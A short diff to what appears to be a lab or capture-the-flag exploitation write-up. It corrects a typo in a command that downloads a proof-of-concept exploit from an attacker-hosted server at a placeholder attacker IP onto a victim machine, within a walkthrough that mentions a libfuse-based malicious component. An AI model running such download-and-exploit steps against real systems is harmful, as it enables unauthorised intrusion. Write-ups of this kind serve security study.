@@ -236,7 +236,7 @@ The compilation process required `libfuse` for the implemention of the malicious
 Then a local python server was locally ran on port 9000, for the download of the exploit on the victim machine with the use of `curl`.
 
 ```bash
-curl -O http://1<attacker_ip>:9000/poc
+curl -O http://<attacker_ip>:9000/poc
 ```
 ##### *Note: Command used on the victim's shell*
 
